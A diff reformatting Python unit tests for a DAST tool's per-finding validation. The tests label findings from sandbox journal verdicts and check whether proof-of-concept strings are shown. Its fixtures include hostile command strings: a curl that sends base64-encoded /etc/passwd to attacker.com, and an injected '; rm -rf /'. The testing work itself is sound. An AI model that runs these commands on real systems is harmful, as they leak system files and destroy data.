@@ -13,7 +13,6 @@ from dast.per_finding import (
     per_finding_stats,
 )
 
-
 # ── _finding_id_for_index ────────────────────────────────────────────────────
 
 
@@ -29,8 +28,20 @@ def test_finding_id_format_matches_dast_runner_convention() -> None:
 
 def test_derive_no_dast_findings_all_not_tested() -> None:
     l1 = [
-        {"cwe": "CWE-78", "type": "command_injection", "severity": "critical", "line": 42, "confidence": 0.9},
-        {"cwe": "CWE-89", "type": "sql_injection", "severity": "high", "line": 88, "confidence": 0.8},
+        {
+            "cwe": "CWE-78",
+            "type": "command_injection",
+            "severity": "critical",
+            "line": 42,
+            "confidence": 0.9,
+        },
+        {
+            "cwe": "CWE-89",
+            "type": "sql_injection",
+            "severity": "high",
+            "line": 88,
+            "confidence": 0.8,
+        },
     ]
     # No journal -> NOT_TESTED for everything not in confirmed list
     out = derive_per_finding_validation(l1, [])
@@ -101,39 +112,33 @@ def test_derive_extra_dast_ids_no_l1_match_ignored() -> None:
 
 
 def test_classify_blocked_keywords() -> None:
-    assert _classify_rejection_rationale(
-        "validator rejected: input is sanitized via shlex.quote at line 42"
-    ) == "BLOCKED"
-    assert _classify_rejection_rationale(
-        "rejected — query uses parameterized statement, sql injection blocked"
-    ) == "BLOCKED"
-    assert _classify_rejection_rationale(
-        "user input is escaped before rendering; safe from XSS"
-    ) == "BLOCKED"
-    assert _classify_rejection_rationale(
-        "the path is validated against an allowlist before file operations"
-    ) == "BLOCKED"
+    assert (
+        _classify_rejection_rationale("validator rejected: input is sanitized via shlex.quote at line 42") == "BLOCKED"
+    )
+    assert (
+        _classify_rejection_rationale("rejected — query uses parameterized statement, sql injection blocked")
+        == "BLOCKED"
+    )
+    assert _classify_rejection_rationale("user input is escaped before rendering; safe from XSS") == "BLOCKED"
+    assert (
+        _classify_rejection_rationale("the path is validated against an allowlist before file operations") == "BLOCKED"
+    )
 
 
 def test_classify_unreached_keywords() -> None:
-    assert _classify_rejection_rationale(
-        "validator rejected: code path is unreachable from external input"
-    ) == "UNREACHED"
-    assert _classify_rejection_rationale(
-        "couldn't trigger the vulnerable code path during sandbox execution"
-    ) == "UNREACHED"
-    assert _classify_rejection_rationale(
-        "no input vector reaches this function; the sink is dead code"
-    ) == "UNREACHED"
-    assert _classify_rejection_rationale(
-        "function never invoked from any reachable entry point"
-    ) == "UNREACHED"
+    assert (
+        _classify_rejection_rationale("validator rejected: code path is unreachable from external input") == "UNREACHED"
+    )
+    assert (
+        _classify_rejection_rationale("couldn't trigger the vulnerable code path during sandbox execution")
+        == "UNREACHED"
+    )
+    assert _classify_rejection_rationale("no input vector reaches this function; the sink is dead code") == "UNREACHED"
+    assert _classify_rejection_rationale("function never invoked from any reachable entry point") == "UNREACHED"
 
 
 def test_classify_other_for_inconclusive() -> None:
-    assert _classify_rejection_rationale(
-        "validator rejected: insufficient evidence to confirm or refute"
-    ) == "OTHER"
+    assert _classify_rejection_rationale("validator rejected: insufficient evidence to confirm or refute") == "OTHER"
     assert _classify_rejection_rationale("rejected: hypothesis was inconclusive") == "OTHER"
     assert _classify_rejection_rationale("") == "OTHER"
 
@@ -182,8 +187,11 @@ def test_index_journal_handles_empty() -> None:
 def test_derive_with_journal_blocked_status() -> None:
     l1 = [{"cwe": "CWE-78", "confidence": 0.9}]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "validator rejected: input is sanitized via shlex.quote"}
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "validator rejected: input is sanitized via shlex.quote",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert len(out) == 1
@@ -194,8 +202,11 @@ def test_derive_with_journal_blocked_status() -> None:
 def test_derive_with_journal_unreached_status() -> None:
     l1 = [{"cwe": "CWE-22"}]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "code path unreachable from any tested input"}
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "code path unreachable from any tested input",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "UNREACHED"
@@ -205,10 +216,7 @@ def test_derive_with_journal_other_rejection_is_not_tested() -> None:
     """Rejection that doesn't match BLOCKED or UNREACHED keywords falls
     through to NOT_TESTED — neither defense nor unreachability proven."""
     l1 = [{"cwe": "CWE-89"}]
-    journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "rejected: insufficient evidence"}
-    ]
+    journal = [{"claim_id": "H001", "verdict": "rejected", "rationale": "rejected: insufficient evidence"}]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "NOT_TESTED"
     # But rejection_reason is preserved for surfacing
@@ -224,10 +232,12 @@ def test_derive_full_4_status_mix() -> None:
         {"cwe": "CWE-94"},  # H004 -> NOT_TESTED (no journal)
     ]
     journal = [
-        {"claim_id": "H002", "verdict": "rejected",
-         "rationale": "input is escaped before SQL execution"},
-        {"claim_id": "H003", "verdict": "rejected",
-         "rationale": "function is never invoked"},
+        {
+            "claim_id": "H002",
+            "verdict": "rejected",
+            "rationale": "input is escaped before SQL execution",
+        },
+        {"claim_id": "H003", "verdict": "rejected", "rationale": "function is never invoked"},
     ]
     out = derive_per_finding_validation(l1, ["H001"], journal)
     assert [r.status for r in out] == ["CONFIRMED", "BLOCKED", "UNREACHED", "NOT_TESTED"]
@@ -237,10 +247,7 @@ def test_derive_confirmed_overrides_journal_rejection() -> None:
     """If finding_id is in dast_findings, it's CONFIRMED regardless of
     any journal records (they may be stale from earlier iterations)."""
     l1 = [{"cwe": "CWE-78"}]
-    journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "earlier iteration said sanitized"}
-    ]
+    journal = [{"claim_id": "H001", "verdict": "rejected", "rationale": "earlier iteration said sanitized"}]
     out = derive_per_finding_validation(l1, ["H001"], journal)
     assert out[0].status == "CONFIRMED"
 
@@ -253,8 +260,11 @@ def test_derive_refuted_verdict_maps_to_blocked() -> None:
     hypothesis based on sandbox observation. Maps to BLOCKED."""
     l1 = [{"cwe": "CWE-78"}]
     journal = [
-        {"claim_id": "H001", "verdict": "refuted",
-         "rationale": "sandbox observed the input never reached subprocess"}
+        {
+            "claim_id": "H001",
+            "verdict": "refuted",
+            "rationale": "sandbox observed the input never reached subprocess",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "BLOCKED"
@@ -264,8 +274,11 @@ def test_derive_inconclusive_verdict_maps_to_not_tested() -> None:
     """`verdict=inconclusive` means sandbox couldn't decide either way."""
     l1 = [{"cwe": "CWE-89"}]
     journal = [
-        {"claim_id": "H001", "verdict": "inconclusive",
-         "rationale": "sandbox returned partial trace"}
+        {
+            "claim_id": "H001",
+            "verdict": "inconclusive",
+            "rationale": "sandbox returned partial trace",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "NOT_TESTED"
@@ -276,8 +289,11 @@ def test_derive_journal_confirmed_verdict_takes_priority_over_text() -> None:
     `confirmed` verdict overrides — the validator confirmed it."""
     l1 = [{"cwe": "CWE-78"}]
     journal = [
-        {"claim_id": "H001", "verdict": "confirmed",
-         "rationale": "input is sanitized but the bypass worked anyway"}
+        {
+            "claim_id": "H001",
+            "verdict": "confirmed",
+            "rationale": "input is sanitized but the bypass worked anyway",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "CONFIRMED"
@@ -288,10 +304,16 @@ def test_derive_rejected_verdict_falls_through_to_text_classifier() -> None:
     Falls through to rationale text classifier — same Tier 1.5 path."""
     l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "input is sanitized via shlex.quote at line 42"},
-        {"claim_id": "H002", "verdict": "rejected",
-         "rationale": "code path unreachable from external input"},
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "input is sanitized via shlex.quote at line 42",
+        },
+        {
+            "claim_id": "H002",
+            "verdict": "rejected",
+            "rationale": "code path unreachable from external input",
+        },
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "BLOCKED"
@@ -314,8 +336,11 @@ def test_infra_stub_reason_when_sandbox_returns_stub() -> None:
     """DAST-203 case: sandbox returned stub trace -> infra_stub."""
     l1 = [{"cwe": "CWE-200"}]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "Sandbox trace for H001 is a stub with no events (is_stub_no_trace=true)"}
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "Sandbox trace for H001 is a stub with no events (is_stub_no_trace=true)",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "NOT_TESTED"
@@ -329,8 +354,11 @@ def test_infra_stub_takes_precedence_over_blocked_keywords() -> None:
     STUB classifier runs first — infra issue, not a defense observation."""
     l1 = [{"cwe": "CWE-78"}]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "is_stub_no_trace=true; the input may be sanitized but couldn't verify"}
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "is_stub_no_trace=true; the input may be sanitized but couldn't verify",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "NOT_TESTED"
@@ -341,8 +369,11 @@ def test_inconclusive_reason_when_rationale_not_classifiable() -> None:
     """Rationale that doesn't match any classifier -> inconclusive."""
     l1 = [{"cwe": "CWE-89"}]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "rejected: insufficient evidence to confirm or refute"}
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "rejected: insufficient evidence to confirm or refute",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "NOT_TESTED"
@@ -353,8 +384,11 @@ def test_inconclusive_reason_for_inconclusive_verdict() -> None:
     """`verdict=inconclusive` directly maps to NOT_TESTED:inconclusive."""
     l1 = [{"cwe": "CWE-89"}]
     journal = [
-        {"claim_id": "H001", "verdict": "inconclusive",
-         "rationale": "sandbox returned partial trace"}
+        {
+            "claim_id": "H001",
+            "verdict": "inconclusive",
+            "rationale": "sandbox returned partial trace",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "NOT_TESTED"
@@ -380,12 +414,14 @@ def test_not_tested_reason_is_none_for_non_not_tested_statuses() -> None:
 def test_confirmed_finding_surfaces_proof_of_concept_from_l1() -> None:
     """For CONFIRMED findings, the L1 vulnerability's proof_of_concept
     string should appear on the per-finding entry (demoable PoC)."""
-    l1 = [{
-        "cwe": "CWE-78",
-        "type": "command_injection",
-        "proof_of_concept": "curl http://attacker.com/?p=$(cat /etc/passwd | base64)",
-        "confidence": 0.95,
-    }]
+    l1 = [
+        {
+            "cwe": "CWE-78",
+            "type": "command_injection",
+            "proof_of_concept": "curl http://attacker.com/?p=$(cat /etc/passwd | base64)",
+            "confidence": 0.95,
+        }
+    ]
     out = derive_per_finding_validation(l1, ["H001"], [])
     assert out[0].status == "CONFIRMED"
     assert out[0].proof_of_concept == "curl http://attacker.com/?p=$(cat /etc/passwd | base64)"
@@ -396,8 +432,11 @@ def test_confirmed_finding_surfaces_runtime_evidence_from_journal() -> None:
     its rationale as runtime_evidence."""
     l1 = [{"cwe": "CWE-78", "proof_of_concept": "; rm -rf /"}]
     journal = [
-        {"claim_id": "H001", "verdict": "confirmed",
-         "rationale": "Sandbox observed subprocess.run with shell=True invoked attacker payload"}
+        {
+            "claim_id": "H001",
+            "verdict": "confirmed",
+            "rationale": "Sandbox observed subprocess.run with shell=True invoked attacker payload",
+        }
     ]
     out = derive_per_finding_validation(l1, ["H001"], journal)
     assert out[0].status == "CONFIRMED"
@@ -418,13 +457,18 @@ def test_confirmed_finding_no_poc_when_l1_lacks_one() -> None:
 def test_blocked_finding_does_not_surface_poc() -> None:
     """PoC is meaningless on BLOCKED — the attack didn't work. Don't
     surface it (would mislead users into thinking exploitation worked)."""
-    l1 = [{
-        "cwe": "CWE-78",
-        "proof_of_concept": "; rm -rf /",
-    }]
+    l1 = [
+        {
+            "cwe": "CWE-78",
+            "proof_of_concept": "; rm -rf /",
+        }
+    ]
     journal = [
-        {"claim_id": "H001", "verdict": "rejected",
-         "rationale": "input is sanitized via shlex.quote"}
+        {
+            "claim_id": "H001",
+            "verdict": "rejected",
+            "rationale": "input is sanitized via shlex.quote",
+        }
     ]
     out = derive_per_finding_validation(l1, [], journal)
     assert out[0].status == "BLOCKED"
@@ -447,8 +491,13 @@ def test_poc_truncated_to_500_chars() -> None:
 
 def test_to_dict_round_trip() -> None:
     r = PerFindingValidation(
-        finding_id="H001", cwe="CWE-78", type="cmd", severity="high",
-        line=42, status="CONFIRMED", confidence=0.9,
+        finding_id="H001",
+        cwe="CWE-78",
+        type="cmd",
+        severity="high",
+        line=42,
+        status="CONFIRMED",
+        confidence=0.9,
     )
     d = r.to_dict()
     assert d["finding_id"] == "H001"
@@ -548,10 +597,12 @@ def test_stats_all_confirmed() -> None:
 
 
 def test_stats_accepts_dict_form() -> None:
-    s = per_finding_stats([
-        {"finding_id": "H001", "status": "CONFIRMED"},
-        {"finding_id": "H002", "status": "NOT_TESTED"},
-    ])
+    s = per_finding_stats(
+        [
+            {"finding_id": "H001", "status": "CONFIRMED"},
+            {"finding_id": "H002", "status": "NOT_TESTED"},
+        ]
+    )
     assert s["n_confirmed"] == 1
     assert s["n_not_tested"] == 1
     assert s["confirmed_pct"] == 50.0
